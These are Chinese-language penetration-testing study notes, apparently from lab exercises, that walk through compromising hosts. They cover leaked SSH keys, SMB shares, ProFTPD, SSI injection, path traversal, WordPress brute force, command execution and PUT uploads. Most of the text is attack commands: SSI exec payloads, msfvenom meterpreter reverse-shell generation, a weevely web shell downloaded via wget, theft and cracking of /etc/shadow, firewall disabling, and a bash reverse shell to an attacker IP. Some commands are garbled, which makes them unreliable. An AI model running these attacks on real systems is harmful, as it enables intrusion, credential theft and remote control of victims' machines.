后期对免杀和对src挖掘在做研究

确认目标ip
192.168.1.57

./ssh泻出漏洞
1、使用nmap扫描端口
nmap -sV 192.168.1.57
根据端口服务进一步渗透
80--http服务
(进入浏览器查看网页，如果网页不存在意味着地址不对，使用dirb进行扫描）
2、dirb http://ip:31337
扫描目标网页
3、存在./ssh（即有可能有ssh私钥泄露）
直接下载下来./ssh/id_rsa(目标）
chmod 600 ./*(加个权限）
4、ssh -i id_rsa simon@ip
(没密码登不上去，所以我们想办法破解密码）
5、使用john破解密码
python /usr/share/john/ssh2jhon.py id_rsa > rsacrack
zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules rsacrack
(对密码进行破解）
6、使用账号密码进行登录，但发现没有足够的权限
find / -perm -4000 2>/dev/null
查看当前权限可做
想办法去提权（本权限和root权限有什么交互内容）
列子：c语言溢出漏洞
/bin/sh

./smb信息泄露
1、发现开启smb服务
2、尝试连接smb--默认print
smbclient -L ip
smbclient '\\ip\share$'
3、连接成功后进行下载文件
get 1.txt (下载目标文件）
4、查看配置文件，（可能获得）用户名和账号
wp-conf
5、找到可以编辑php文件的地方，尝试制作木马
msfvenom php/meterpreter/reverse_tcp lhost=192.168.152.130 lport=6666 -f php
> shell.php
6、获得账号密码
sudo -l 查看可执行权限

wordpress安装

ftp系实战
1、ftp
searchsploit ProFTPD 1.3.3c（获取ftp版本信息）
搜索对应的0day漏洞
也可以在metersploit中搜索
2、使用攻击载荷
cmd/unix/reverse

SSI注入实战
（server side inject)
1、80端口web访问
2、网站
出现shtml文件.stm .shtm---有些xss也可能存在ssi漏洞
nikto -h http://ip(侦察）
dirb ip
（双开扫描）
发现部分网站绝对路径
3、post提交抓包查看内容（可能有料）
尝试注入ssi命令（#后面写入命令）
<!-- #exec cmd="cat /etc/passwd" -->
<!--#echo var="REMOTE_ADDR" -->
<!--#include virtual="/wwwroot/xxx.html" --> 文件可写入的话
4、反射木马或使用wget命令远程下载木马

路径遍历实战
1、owasp-zap图形化扫描工具
结果放在alert中
2、发现目录遍历漏洞
结合上传木马
3、
建立一个叫.php的数据库并写入文件
weevely generate 123456（密码） /root/shell.php(生成一个木马）
<?php system("cd /tmp;wget http://ip:8000/shell.php;chmod +x shell.php;")?>
python -m SimpleHTTPServer(开放8000端口）
4、连接木马
weevely 木马位置 123456
获得root权限

暴力破解实战
1、网站扫描
2、访问网站（显示不太正常，扫描时有域名存在，估计加上域名才能正常显示）
/etc/hosts  添加域名
www.域名.com
3、wp-login.php暴力破解
4、编写404界面，注入木马
5、download 文件
download /etc/passwd
download /etc/shadow
6、合并文件并破解
unshadow passwd shadow > crack
john  crack


命令执行实战
1、网站扫描
2、发现有命令执行网页（检查是否有命令执行漏洞）
3、ls -la /home/
uname -a
使用本地权限进行登录
ssh -i bil@localhost sudo ufw disable(关闭防火墙）
登录后反弹shell到黑客主机
sudo bash -i& /tcp/192.168.152.130:4444 0>&1


PUT漏洞实战(中间件）
1、扫描ip端口
2、扫描网站
3、查看网站支持
curl -v -X OPTIONS http://192.168.1.154/test/
4、PUT是很危险的协议
利用火狐工具Poster，上传php文件，进行PUT写入



